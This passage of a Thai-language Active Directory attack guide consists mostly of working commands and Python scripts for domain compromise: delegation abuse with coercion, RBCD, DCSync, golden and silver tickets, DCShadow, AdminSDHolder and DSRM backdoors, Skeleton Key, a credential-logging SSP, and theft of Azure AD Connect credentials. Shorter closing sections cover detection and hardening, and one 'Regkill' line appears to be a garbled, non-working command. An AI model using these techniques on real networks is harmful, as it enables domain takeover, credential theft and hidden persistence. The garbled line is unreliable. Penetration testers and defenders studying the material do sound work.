        self.dc_ip = dc_ip
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\{username}',
            password=password,
            authentication='NTLM',
            auto_bind=True
        )
    
    def find_unconstrained(self):
        """หา computers/users ที่มี Unconstrained Delegation"""
        # userAccountControl bit 0x80000 = TRUSTED_FOR_DELEGATION
        self.conn.search(
            self.base_dn,
            '(userAccountControl:1.2.840.113556.1.4.803:=524288)',
            attributes=['sAMAccountName', 'operatingSystem', 'distinguishedName', 'userAccountControl']
        )
        
        results = []
        for entry in self.conn.entries:
            obj_type = 'Computer' if 'computer' in str(entry.distinguishedName).lower() else 'User'
            results.append({
                'name': str(entry.sAMAccountName),
                'type': obj_type,
                'dn': str(entry.distinguishedName),
                'os': str(entry.operatingSystem) if obj_type == 'Computer' else 'N/A'
            })
        
        print(f"[+] Found {len(results)} objects with Unconstrained Delegation:")
        for r in results:
            if 'DC' not in r['name'].upper():  # ข้าม DC (ปกติแล้ว)
                print(f"  [!] {r['type']}: {r['name']} ({r['os']})")
                print(f"      DN: {r['dn']}")
        
        return results
    
    def check_admin_on_target(self, target_computer):
        """ตรวจสอบว่ามี admin rights บน target หรือไม่"""
        print(f"[*] Checking admin access to {target_computer}...")
        print(f"[*] Test: net use \\\\{target_computer}\\C$ /user:{self.domain}\\username password")
    
    def generate_attack_commands(self, target_computer, dc_name):
        """สร้าง commands สำหรับ exploit"""
        print("\n[*] Attack Commands:")
        print(f"""1. Monitor for TGTs on {target_computer}:
   .\\Rubeus.exe monitor /interval:5 /nowrap

2. Coerce DC ({dc_name}) to authenticate to {target_computer}:
   # PetitPotam:
   python3 PetitPotam.py <{target_computer}_ip> <{dc_name}_ip>
   
   # PrinterBug:
   python3 printerbug.py '{self.domain}/user:password'@{dc_name} <{target_computer}_ip>
   
   # Coercer:
   python3 coercer.py coerce -u user -p password -d {self.domain} -t {dc_name} -l <{target_computer}_ip>

3. ใน Rubeus จะเห็น TGT ของ {dc_name}$
   .\\Rubeus.exe ptt /ticket:<base64_TGT>

4. DCSync:
   mimikatz.exe >> lsadump::dcsync /user:krbtgt /domain:{self.domain}
   secretsdump.py -k -no-pass {dc_name}.{self.domain.lower()} -just-dc-ntlm
""")

if __name__ == "__main__":
    hunter = UnconstrainedDelegationHunter(
        domain="corp.local",
        dc_ip="192.168.1.10",
        username="pentest",
        password="P@ssw0rd!"
    )
    
    targets = hunter.find_unconstrained()
    if targets:
        target = targets[0]['name'].rstrip('$')
        hunter.generate_attack_commands(target, "DC01")
```

---

## 7. Constrained Delegation Abuse

### Constrained Delegation คืออะไร

```
Constrained Delegation (S4U — Service for User):
- S4U2Self: service สามารถขอ service ticket สำหรับ user ใดก็ได้ในนามตัวเอง
  (โดยไม่ต้องรู้ password ของ user)
- S4U2Proxy: ใช้ service ticket จาก S4U2Self เพื่อขอ ticket ไปยัง service อื่น

msDSAllowedToDelegateTo attribute กำหนด service ที่ delegation ไปได้

วิธี exploit:
ถ้า account มีสิทธิ์ Constrained Delegation ไปยัง CIFS/DC:
1. S4U2Self: ขอ ST ในนาม administrator
2. S4U2Proxy: ใช้ ST นั้น access CIFS บน DC
3. มีสิทธิ์เหมือน administrator บน DC
```

```bash
# ค้นหา accounts ที่มี Constrained Delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} \
    -Properties msDS-AllowedToDelegateTo,sAMAccountName |
    Select-Object sAMAccountName, msDS-AllowedToDelegateTo

# Exploit ด้วย Rubeus (ถ้ามี credentials ของ account นั้น)
.\Rubeus.exe s4u /user:svcaccount /password:'Password123!' /impersonateuser:administrator \
    /msdsspn:cifs/dc01.corp.local /ptt

# ตอนนี้มี ticket ของ administrator บน CIFS/DC01
dir \\dc01.corp.local\c$

# ด้วย impacket
python3 getST.py -spn cifs/dc01.corp.local \
    -impersonate administrator \
    -dc-ip 192.168.1.10 \
    corp.local/svcaccount:Password123!

export KRB5CCNAME=administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
smbclient.py -k -no-pass dc01.corp.local

# ถ้า delegation เป็น Protocol Transition (TrustedToAuthForDelegation)
# สามารถ impersonate user ใดก็ได้ แม้ไม่มี ticket ของ user นั้น
python3 getST.py -spn cifs/dc01.corp.local \
    -impersonate administrator \
    -self \
    -altservice cifs \
    -dc-ip 192.168.1.10 \
    corp.local/svcaccount:Password123!
```

---

## 8. Resource-Based Constrained Delegation (RBCD)

### RBCD คืออะไร

```
RBCD (Resource-Based Constrained Delegation):
- กำหนดที่ resource (target) แทนที่จะกำหนดที่ source
- msDS-AllowedToActOnBehalfOfOtherIdentity attribute บน target computer
- กำหนดว่า computer ไหนสามารถ delegate ไปยัง target ได้

วิธี exploit (RBCD attack):
ถ้า attacker มี GenericWrite บน Computer object A:
1. สร้าง computer account ใหม่ (attacker-controlled)
2. เขียน msDS-AllowedToActOnBehalfOfOtherIdentity บน A
   ให้ point ไปยัง computer ใหม่
3. S4U2Self + S4U2Proxy เพื่อ access A ในนาม admin
```

```bash
# ขั้นตอน RBCD Attack ด้วย impacket

# 1. สร้าง computer account ใหม่ (ต้องการ MachineAccountQuota > 0 หรือสิทธิ์ Join Domain)
python3 addcomputer.py corp.local/pentest:P@ssw0rd! \
    -computer-name 'EVILPC$' \
    -computer-pass 'EvilPass123!' \
    -dc-ip 192.168.1.10

# 2. ตั้งค่า RBCD บน target computer (FILESERVER$)
python3 rbcd.py -delegate-from 'EVILPC$' \
    -delegate-to 'FILESERVER$' \
    -action write \
    -dc-ip 192.168.1.10 \
    corp.local/pentest:P@ssw0rd!

# 3. S4U2Self + S4U2Proxy
python3 getST.py -spn cifs/fileserver.corp.local \
    -impersonate administrator \
    -dc-ip 192.168.1.10 \
    corp.local/'EVILPC$':EvilPass123!

# 4. ใช้ ticket
export KRB5CCNAME=administrator@cifs_fileserver.corp.local@CORP.LOCAL.ccache
smbexec.py -k -no-pass fileserver.corp.local

# ทำความสะอาด: ลบ RBCD
python3 rbcd.py -delegate-from 'EVILPC$' \
    -delegate-to 'FILESERVER$' \
    -action remove \
    -dc-ip 192.168.1.10 \
    corp.local/pentest:P@ssw0rd!
```

```python
#!/usr/bin/env python3
"""rbcd_attack.py — Resource-Based Constrained Delegation attack"""

from ldap3 import Server, Connection, ALL, MODIFY_REPLACE
from ldap3.utils.conv import escape_filter_chars
import struct

class RBCDAttack:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\{username}',
            password=password,
            authentication='NTLM',
            auto_bind=True
        )
    
    def get_object_sid(self, sam_name):
        """ดึง SID ของ object"""
        self.conn.search(
            self.base_dn,
            f'(sAMAccountName={escape_filter_chars(sam_name)})',
            attributes=['objectSid', 'distinguishedName']
        )
        if self.conn.entries:
            sid_bytes = bytes(self.conn.entries[0].objectSid)
            dn = str(self.conn.entries[0].distinguishedName)
            return sid_bytes, dn
        return None, None
    
    def set_rbcd(self, target_computer, source_computer):
        """
        ตั้งค่า msDS-AllowedToActOnBehalfOfOtherIdentity
        target_computer จะ allow source_computer ทำ delegation
        """
        source_sid, _ = self.get_object_sid(source_computer)
        _, target_dn = self.get_object_sid(target_computer)
        
        if not source_sid or not target_dn:
            print("[-] Object not found")
            return False
        
        # สร้าง Security Descriptor
        # D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)
        # Simplified: สร้าง raw SD ที่อนุญาต GenericAll ให้ source_sid
        
        # ใช้ impacket แทนสำหรับ SD สร้าง
        print(f"[*] Setting RBCD: {target_computer} allows {source_computer}")
        print(f"[*] Target DN: {target_dn}")
        print(f"[*] Source SID: {source_sid.hex()}")
        
        # สร้าง SD ด้วย impacket
        sd_cmd = f"""python3 rbcd.py -delegate-from '{source_computer}' \
-delegate-to '{target_computer}' \
-action write \
-dc-ip {self.dc_ip} \
{self.domain}/username:password"""
        print(f"[*] Command: {sd_cmd}")
        
        return True
    
    def verify_rbcd(self, target_computer):
        """ตรวจสอบ RBCD configuration"""
        _, target_dn = self.get_object_sid(target_computer)
        
        self.conn.search(
            self.base_dn,
            f'(distinguishedName={escape_filter_chars(target_dn)})',
            attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity']
        )
        
        if self.conn.entries:
            rbcd = self.conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].value
            if rbcd:
                print(f"[+] RBCD is set on {target_computer}")
                return True
        
        print(f"[-] No RBCD on {target_computer}")
        return False

if __name__ == "__main__":
    attack = RBCDAttack("corp.local", "192.168.1.10", "pentest", "P@ssw0rd!")
    attack.set_rbcd("FILESERVER$", "EVILPC$")
    attack.verify_rbcd("FILESERVER$")
```

---

## 9. AdminSDHolder Abuse

### AdminSDHolder คืออะไร

```
AdminSDHolder คือ special container ใน AD:
Path: CN=AdminSDHolder,CN=System,DC=corp,DC=local

ทำงานอย่างไร:
- SDProp (Security Descriptor Propagator) รันทุกๆ 60 นาที (ค่า default)
- SDProp คัดลอก DACL จาก AdminSDHolder ไปยัง Protected Groups/Users

Protected objects:
- Domain Admins, Enterprise Admins, Schema Admins
- Administrators, Account Operators, Backup Operators
- Print Operators, Server Operators, Replicator
- KRBTGT, Domain Controllers

Abuse:
ถ้าแก้ DACL ของ AdminSDHolder ให้ attacker มีสิทธิ์
-> ทุกๆ 60 นาที สิทธิ์จะถูก propagate ไปยัง protected objects ทั้งหมด
-> เป็น persistence ที่ดี เพราะถ้าไม่รู้ จะเพิ่มกลับมาเอง!
```

```powershell
# ตรวจสอบ DACL ของ AdminSDHolder
Get-ObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs

# เพิ่ม ACE ใหม่ให้ attacker บน AdminSDHolder
Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
    -PrincipalIdentity lowpriv \
    -Rights GenericAll

# รอ 60 นาที หรือบังคับให้ SDProp รันทันที
Invoke-ADSDPropagation
# หรือ
Regkill HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtected

# หลังจาก propagation: lowpriv มีสิทธิ์บน DA, EA ทั้งหมด
Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -eq 'lowpriv'}
```

```python
#!/usr/bin/env python3
"""adminsdholder.py — ตรวจสอบ AdminSDHolder misconfiguration"""

from ldap3 import Server, Connection, ALL

class AdminSDHolderChecker:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\{username}',
            password=password,
            authentication='NTLM',
            auto_bind=True
        )
    
    def check_adminsdholder_acl(self):
        """ตรวจสอบ DACL ของ AdminSDHolder"""
        ash_dn = f'CN=AdminSDHolder,CN=System,{self.base_dn}'
        
        self.conn.search(
            ash_dn,
            '(objectClass=*)',
            attributes=['nTSecurityDescriptor'],
            controls=[security_descriptor_control(sdflags=0x04)]
        )
        
        print(f"[*] Checking AdminSDHolder ACL...")
        print(f"[*] DN: {ash_dn}")
        print(f"[*] Use PowerView: Get-ObjectAcl -Identity 'CN=AdminSDHolder,CN=System,{self.base_dn}' -ResolveGUIDs")
    
    def find_admincount_users(self):
        """หา users/groups ที่มี adminCount=1 (protected by AdminSDHolder)"""
        self.conn.search(
            self.base_dn,
            '(adminCount=1)',
            attributes=['sAMAccountName', 'objectClass', 'distinguishedName']
        )
        
        protected = []
        for entry in self.conn.entries:
            obj_type = 'User' if 'user' in str(entry.objectClass) else \
                       'Computer' if 'computer' in str(entry.objectClass) else 'Group'
            protected.append({
                'name': str(entry.sAMAccountName),
                'type': obj_type,
                'dn': str(entry.distinguishedName)
            })
        
        print(f"[+] Protected objects (adminCount=1): {len(protected)}")
        for obj in protected:
            print(f"  - [{obj['type']}] {obj['name']}")
        
        return protected
    
    def check_sdprop_interval(self):
        """ตรวจสอบ SDProp interval"""
        self.conn.search(
            f'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,{self.base_dn}',
            '(objectClass=nTDSService)',
            attributes=['sDPropagationRate']
        )
        
        if self.conn.entries:
            rate = self.conn.entries[0].sDPropagationRate.value
            print(f"[*] SDProp interval: {rate} minutes (default: 60)")
        else:
            print("[*] SDProp interval: 60 minutes (default)")

if __name__ == "__main__":
    checker = AdminSDHolderChecker("corp.local", "192.168.1.10", "pentest", "P@ssw0rd!")
    checker.find_admincount_users()
    checker.check_sdprop_interval()
```

---

## 10. DCShadow Attack

### DCShadow คืออะไร

```
DCShadow:
- สร้าง "rogue DC" ชั่วคราวโดยใช้ credentials ของ DA
- บังคับ replication เพื่อ push changes เข้า AD โดยไม่ผ่าน logs ปกติ
- Bypass event logging ส่วนใหญ่
- ต้องการ: Domain Admin หรือ Enterprise Admin credentials

ข้อดีสำหรับ attacker:
- เพิ่ม user เข้า DA group โดยไม่มี logs
- เปลี่ยน SIDHistory
- เพิ่ม permissions โดยไม่มี audit trail ปกติ
```

```bash
# DCShadow ด้วย mimikatz (ต้องการ DA creds)
# ต้องรัน 2 instances พร้อมกัน!

# Instance 1: push change (รันด้วย DA credentials หรือ PTH)
# เปิด cmd ด้วย runas
runas /noprofile /user:corp\administrator cmd

# ใน cmd ที่ run เป็น DA:
mimikatz.exe
lsadump::dcshadow /domain:corp.local /object:lowpriv /attribute:groups /value:"<SID_of_DA>"

# Instance 2: trigger replication
# เปิด mimikatz อีก instance
mimikatz.exe
lsadump::dcshadow /push

# ดู current groups ของ lowpriv
Get-ADGroupMember 'Domain Admins' | Where {$_.SamAccountName -eq 'lowpriv'}

# DCShadow สำหรับ SIDHistory (forest trust escalation)
mimikatz.exe
lsadump::dcshadow /domain:corp.local /object:lowpriv /attribute:SIDHistory /value:<enterprise_admin_SID>
```

---

## 11. Cross-Forest Trust Attacks

### Forest Trust Enumeration

```bash
# ดู trust relationships
Get-ADTrust -Filter * | Select Name, TrustType, TrustDirection, TrustAttributes

# PowerView
Get-DomainTrust | Where-Object {$_.TrustDirection -eq 'Bidirectional' -or $_.TrustDirection -eq 'Inbound'}

# ด้วย ldapsearch
ldapsearch -x -H ldap://192.168.1.10 -D 'corp\pentest' -w 'P@ssw0rd!' \
    -b 'CN=System,DC=corp,DC=local' \
    '(objectClass=trustedDomain)' name trustDirection trustAttributes

# Trust Attributes:
# 0x1  = TRUST_ATTRIBUTE_NON_TRANSITIVE
# 0x2  = TRUST_ATTRIBUTE_UPLEVEL_ONLY
# 0x4  = TRUST_ATTRIBUTE_QUARANTINED_DOMAIN
# 0x8  = TRUST_ATTRIBUTE_FOREST_TRANSITIVE
# 0x20 = TRUST_ATTRIBUTE_CROSS_ORGANIZATION
# 0x40 = TRUST_ATTRIBUTE_WITHIN_FOREST
```

### SID History Attack (Inter-Forest)

```bash
# ถ้า SID Filtering ปิดอยู่ใน forest trust:
# สามารถแอบอ้าง SID ของ EA ใน target forest

# สร้าง Golden Ticket ด้วย SIDHistory
mimikatz.exe
kerberos::golden /user:administrator /domain:child.corp.local \
    /sid:<CHILD_DOMAIN_SID> \
    /krbtgt:<CHILD_KRBTGT_HASH> \
    /sids:<ENTERPRISE_ADMINS_SID_OF_PARENT> \
    /ticket:golden.kirbi

# ใช้ ticket access parent domain
kerberos::ptt golden.kirbi
ls \\parent.local\c$

# ตรวจสอบ SID Filtering (ต้องรัน ด้วย DA creds)
netdom trust child.corp.local /domain:corp.local /quarantine

# ด้วย impacket
python3 ticketer.py -nthash <krbtgt_hash> \
    -domain child.corp.local \
    -domain-sid <child_domain_sid> \
    -extra-sid <parent_EA_SID> \
    administrator
```

### PAC Privilege Escalation (MS14-068)

```bash
# ตรวจสอบว่า patch MS14-068 ถูก apply หรือยัง
# (เก่ามากแล้ว แต่ยังพบใน old environments)

# exploit ด้วย impacket
python3 goldenPac.py corp.local/lowpriv:P@ssw0rd!@dc01.corp.local
```

---

## 12. Azure AD Hybrid Attacks

### Azure AD Connect — Password Hash Sync Attack

```
Azure AD Connect synchronizes on-prem AD กับ Azure AD
Account ที่ใช้ synchronization มีสิทธิ์:
- Replicate Directory Changes (บน on-prem AD)
- MSOL_ account

ถ้าดึง credentials ของ MSOL_ account:
-> สามารถทำ DCSync บน on-prem AD ได้
-> สามารถดึง password hashes ของทุกคนได้
```

```powershell
# ค้นหา MSOL account (บน Azure AD Connect server)
Get-ADUser -Filter {SamAccountName -like 'MSOL_*'} -Properties Description | 
    Select SamAccountName, Description

# ถ้ามีสิทธิ์บน Azure AD Connect server
# ดึง credentials ของ MSOL_ account ด้วย AADInternals
Install-Module AADInternals

Import-Module AADInternals
# ดึง MSOL credentials
Get-AADIntSyncCredentials

# ใช้ credentials ทำ DCSync
mimikatz.exe
lsadump::dcsync /user:corp\krbtgt /domain:corp.local \
    /authuser:MSOL_abc123 /authdomain:corp.local /authpassword:password

# หรือ impacket
python3 secretsdump.py corp.local/MSOL_abc123:password@dc01.corp.local -just-dc
```

### PHS (Password Hash Synchronization) Abuse

```bash
# ด้วย ROADtools
pip install roadtools roadtx

# Enum Azure AD objects
roadrecon gather -u pentest@corp.onmicrosoft.com -p 'P@ssw0rd!'
roadrecon gui  # เปิด web GUI

# ด้วย AADInternals
Import-Module AADInternals

# Login
$cred = Get-Credential
$token = Get-AADIntAccessTokenForAADGraph -Credentials $cred

# ดึง user info
Get-AADIntUsers -AccessToken $token | Select UserPrincipalName,ObjectId

# Azure AD Pass-Through Authentication (PTA) Attack
# ถ้ามีสิทธิ์บน Azure AD Connect:
# ติดตั้ง backdoor ใน PTA
Install-AADIntPTASpy

# ทุกครั้งที่ใครทำ PTA login:
Get-AADIntPTASpyLog
```

---

## 13. Advanced Persistence Techniques

### Golden Ticket

```bash
# ดึง krbtgt hash ก่อน
mimikatz.exe
lsadump::dcsync /user:corp\krbtgt

# สร้าง Golden Ticket
mimikatz.exe
kerberos::golden /user:fakeadmin \
    /domain:corp.local \
    /sid:<DOMAIN_SID> \
    /krbtgt:<KRBTGT_NTLM_HASH> \
    /id:500 \
    /groups:512 \
    /ticket:golden.kirbi

# ใช้ Golden Ticket
kerberos::ptt golden.kirbi
dir \\dc01.corp.local\c$

# Golden Ticket ด้วย impacket
python3 ticketer.py \
    -nthash <krbtgt_hash> \
    -domain-sid <domain_sid> \
    -domain corp.local \
    -groups 512 \
    fakeadmin

export KRB5CCNAME=fakeadmin.ccache
psexec.py -k -no-pass corp.local/fakeadmin@dc01.corp.local
```

### Silver Ticket

```bash
# Silver Ticket ใช้ computer account hash แทน krbtgt
# จำกัดการใช้งานเฉพาะ service นั้นๆ แต่ bypass KDC

mimikatz.exe
kerberos::golden /user:fakeadmin \
    /domain:corp.local \
    /sid:<DOMAIN_SID> \
    /target:dc01.corp.local \
    /service:cifs \
    /rc4:<DC_COMPUTER_ACCOUNT_NTLM_HASH> \
    /id:500 \
    /ticket:silver.kirbi

kerberos::ptt silver.kirbi
dir \\dc01.corp.local\c$
```

### Skeleton Key

```bash
# Skeleton Key: inject master password ลงใน LSASS บน DC
# ทุก account จะ accept password 'mimikatz' เพิ่มเติม
# (ไม่ persist หลัง reboot)

mimikatz.exe
misc::skeleton

# ทดสอบ
net use \\dc01.corp.local\c$ /user:administrator mimikatz
```

### Directory Service Restore Mode (DSRM) Backdoor

```bash
# DSRM account คือ local admin บน DC แม้ AD หยุดทำงาน
# ตั้งค่าให้ DSRM password สามารถใช้ NetworkLogon ได้

# รันบน DC ในฐานะ DA
# แก้ registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# ดึง DSRM password hash
mimikatz.exe
lsadump::sam
# หา account 'Administrator' ใน SAM

# ใช้ PTH ด้วย DSRM hash
python3 secretsdump.py -hashes :DSRMhash corp.local/administrator@dc01.corp.local
```

### Custom SSP (Security Support Provider)

```bash
# inject custom SSP เพื่อ log credentials ทุกครั้งที่มีการ authenticate
# บน DC

# สร้าง mimilib.dll (ส่วนหนึ่งของ mimikatz)
# copy ไปยัง C:\Windows\System32\
copy mimilib.dll C:\Windows\System32\

# เพิ่มลงใน SSP list
reg add HKLM\System\CurrentControlSet\Control\Lsa /v 'Security Packages' \
    /t REG_MULTI_SZ /d kerberos:msv1_0:schannel:wdigest:tspkg:pku2u:mimilib

# หลัง reboot: credentials จะถูก log ไปที่
# C:\Windows\System32\kiwissp.log
```

---

## 14. AD Forensics และ Detection

### Event IDs สำคัญ

```
Event IDs ที่ต้องตรวจสอบ:

4624 - Account Logon Success
4625 - Account Logon Failure
4648 - Logon with explicit credentials
4661 - Object handle request
4662 - Object operation (DCSync)
4663 - Object access
4720 - User account created
4728 - Member added to security group
4732 - Member added to local group
4756 - Member added to universal group
4768 - Kerberos TGT request (AS-REQ)
4769 - Kerberos ST request (TGS-REQ)
4771 - Kerberos pre-auth failed
4776 - NTLM authentication

DCSync Detection:
- Event 4662 (ObjectAccess) + AccessMask 0x100 (Control Access)
- PropertyAccess: 1131f6aa (Replicating Changes)

Golden Ticket Detection:
- TGT lifetime > 10 hours (default maximum)
- Account ไม่ exist ใน AD แต่มี TGT
- Logon type 3 โดยไม่มี 4768 ก่อนหน้า

Kerberoasting Detection:
- Event 4769 ที่ Encryption Type = 0x17 (RC4-HMAC)
  จำนวนมากจาก IP เดียวกัน

AS-REP Roasting Detection:
- Event 4768 ที่ PreAuthentication Type = 0

Silver Ticket Detection:
- Logon โดยไม่มี 4768 ก่อนหน้า (ไม่ผ่าน KDC)
```

### Python AD Security Monitoring

```python
#!/usr/bin/env python3
"""ad_monitor.py — ตรวจจับการโจมตี Active Directory"""

from ldap3 import Server, Connection, ALL
from datetime import datetime, timedelta
from collections import defaultdict
import re

class ADSecurityMonitor:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\{username}',
            password=password,
            authentication='NTLM',
            auto_bind=True
        )
        self.findings = []
    
    def check_kerberoastable(self):
        """หา Kerberoastable accounts"""
        self.conn.search(
            self.base_dn,
            '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt)))',
            attributes=['sAMAccountName', 'servicePrincipalName', 
                       'memberOf', 'pwdLastSet', 'lastLogon']
        )
        
        kerberoastable = []
        for entry in self.conn.entries:
            groups = [str(g) for g in entry.memberOf]
            is_privileged = any('Domain Admins' in g or 'Administrators' in g for g in groups)
            
            kerberoastable.append({
                'user': str(entry.sAMAccountName),
                'spns': list(entry.servicePrincipalName),
                'privileged': is_privileged,
                'risk': 'CRITICAL' if is_privileged else 'HIGH'
            })
        
        if kerberoastable:
            self.findings.append({
                'type': 'Kerberoastable Accounts',
                'count': len(kerberoastable),
                'details': kerberoastable
            })
        
        return kerberoastable
    
    def check_asreproastable(self):
        """หา AS-REP Roastable accounts"""
        self.conn.search(
            self.base_dn,
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(objectClass=computer)))',
            attributes=['sAMAccountName', 'memberOf', 'pwdLastSet']
        )
        
        asreproastable = [str(e.sAMAccountName) for e in self.conn.entries]
        if asreproastable:
            self.findings.append({
                'type': 'AS-REP Roastable',
                'count': len(asreproastable),
                'users': asreproastable
            })
        
        return asreproastable
    
    def check_password_policy(self):
        """ตรวจสอบ password policy ว่าอ่อนแอหรือไม่"""
        self.conn.search(
            self.base_dn,
            '(objectClass=domain)',
            attributes=['minPwdLength', 'pwdHistoryLength', 
                       'maxPwdAge', 'lockoutThreshold', 'lockoutDuration']
        )
        
        if self.conn.entries:
            entry = self.conn.entries[0]
            issues = []
            
            min_len = int(str(entry.minPwdLength)) if entry.minPwdLength.value else 0
            if min_len < 12:
                issues.append(f"Min password length too short: {min_len} (recommend >= 12)")
            
            lockout = int(str(entry.lockoutThreshold)) if entry.lockoutThreshold.value else 0
            if lockout == 0:
                issues.append("No account lockout policy!")
            
            if issues:
                self.findings.append({'type': 'Weak Password Policy', 'issues': issues})
            
            return {
                'min_length': min_len,
                'lockout_threshold': lockout,
                'issues': issues
            }
    
    def check_privileged_group_membership(self):
        """ตรวจสอบ members ของ privileged groups"""
        privileged_groups = [
            'Domain Admins', 'Enterprise Admins', 'Schema Admins',
            'Administrators', 'Account Operators', 'Backup Operators'
        ]
        
        group_members = {}
        for group in privileged_groups:
            self.conn.search(
                self.base_dn,
                f'(sAMAccountName={group})',
                attributes=['member']
            )
            if self.conn.entries:
                members = [str(m).split(',')[0].replace('CN=', '') 
                          for m in self.conn.entries[0].member]
                group_members[group] = members
        
        return group_members
    
    def check_dcsync_rights(self):
        """หา accounts ที่มี DCSync rights"""
        print("[*] Checking for DCSync rights...")
        print("[*] Use PowerView: Get-ObjectAcl -Identity (Get-Domain).Name -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'DS-Replication'}")
    
    def check_adminsdholder_backdoor(self):
        """ตรวจสอบ AdminSDHolder backdoors"""
        ash_dn = f'CN=AdminSDHolder,CN=System,{self.base_dn}'
        self.conn.search(
            ash_dn,
            '(objectClass=*)',
            attributes=['nTSecurityDescriptor']
        )
        print(f"[*] AdminSDHolder DN: {ash_dn}")
        print("[*] Review ACL manually with PowerView or BloodHound")
    
    def generate_report(self):
        """สร้างรายงานสรุป"""
        print("\n" + "="*60)
        print("AD SECURITY ASSESSMENT REPORT")
        print("="*60)
        print(f"Domain: {self.domain}")
        print(f"DC: {self.dc_ip}")
        print(f"Time: {datetime.now().isoformat()}")
        print("")
        
        # รัน checks
        kerb = self.check_kerberoastable()
        asrep = self.check_asreproastable()
        policy = self.check_password_policy()
        groups = self.check_privileged_group_membership()
        
        print(f"[!] Kerberoastable accounts: {len(kerb)}")
        for u in kerb[:5]:  # แสดง 5 อันแรก
            risk = '🔴' if u['privileged'] else '🟡'
            print(f"    {risk} {u['user']}: {', '.join(u['spns'][:2])}")
        
        print(f"\n[!] AS-REP Roastable accounts: {len(asrep)}")
        for u in asrep[:5]:
            print(f"    🟡 {u}")
        
        if policy:
            print(f"\n[!] Password Policy Issues: {len(policy.get('issues', []))}")
            for issue in policy.get('issues', []):
                print(f"    🔴 {issue}")
        
        print("\n[*] Privileged Group Members:")
        for group, members in groups.items():
            if members:
                print(f"    {group} ({len(members)} members): {', '.join(members[:3])}{'...' if len(members) > 3 else ''}")
        
        return self.findings

if __name__ == "__main__":
    monitor = ADSecurityMonitor(
        domain="corp.local",
        dc_ip="192.168.1.10",
        username="pentest",
        password="P@ssw0rd!"
    )
    monitor.generate_report()
```

---

## 15. Defense และ Hardening

### AD Tiering Model

```
Microsoft Tiering Model:

Tier 0: Domain Controllers, PKI, ADFS, AAD Connect
├── เฉพาะ Tier 0 admins เข้าถึงได้
├── Tier 0 admins ห้าม login บน Tier 1/2 machines
└── Protected Users group สำหรับ admin accounts

Tier 1: Member Servers (databases, file servers, apps)
├── Tier 1 admins จัดการได้
└── Tier 1 admins ห้าม login บน Tier 2 machines

Tier 2: Workstations, laptops
└── Helpdesk จัดการได้
```

```powershell
# ตั้งค่า Protected Users group สำหรับ privileged accounts
# Protected Users group ป้องกัน:
# - NTLM authentication
# - DES/RC4 encryption ใน Kerberos
# - TGT lifetime > 4 hours
# - Credential caching

Add-ADGroupMember -Identity 'Protected Users' -Members 'Administrator','svcDA'

# ป้องกัน DCSync ด้วยการตรวจสอบ Replication rights
$DomainDN = (Get-ADDomain).DistinguishedName
$ACL = Get-Acl -Path "AD:\$DomainDN"
$ACL.Access | Where-Object {
    $_.ObjectType -eq [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
    $_.ObjectType -eq [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
} | Select-Object IdentityReference, AccessControlType

# ตรวจสอบ Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
    Where-Object {$_.Name -notlike '*DC*'} |
    Select Name, DistinguishedName

# ลบ Unconstrained Delegation
Set-ADComputer -Identity 'APPSERVER01' -TrustedForDelegation $false

# ตรวจสอบ Kerberoastable accounts และ reset passwords เป็น long random
$kerb = Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName
foreach ($user in $kerb) {
    $newPass = [System.Web.Security.Membership]::GeneratePassword(30, 10)
    Set-ADAccountPassword -Identity $user -NewPassword (ConvertTo-SecureString $newPass -AsPlainText -Force)
    Write-Host "Reset password for $($user.SamAccountName)"
}

# ตรวจสอบ ADCS templates ที่ vulnerable
Get-ADObject -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
    -Filter * -Properties * | 
    Where-Object {$_.pkiExtendedKeyUsage -contains '1.3.6.1.5.5.7.3.2'} |
    Select-Object Name, pkiExtendedKeyUsage
```

### Security Checklist

| ด้าน | การตรวจสอบ | เครื่องมือ | ความสำคัญ |
|------|------------|-----------|----------|
| Kerberos | Kerberoastable accounts | BloodHound, GetUserSPNs | สูง |
| Kerberos | AS-REP Roastable | BloodHound, GetNPUsers | สูง |
| Delegation | Unconstrained Delegation | BloodHound, PowerView | วิกฤต |
| Delegation | Constrained Delegation misuse | BloodHound | สูง |
| ADCS | ESC1-ESC8 | Certipy | วิกฤต |
| ACL | GenericAll/Write on privileged | BloodHound | วิกฤต |
| Credentials | LAPS deployment | PowerView | สูง |
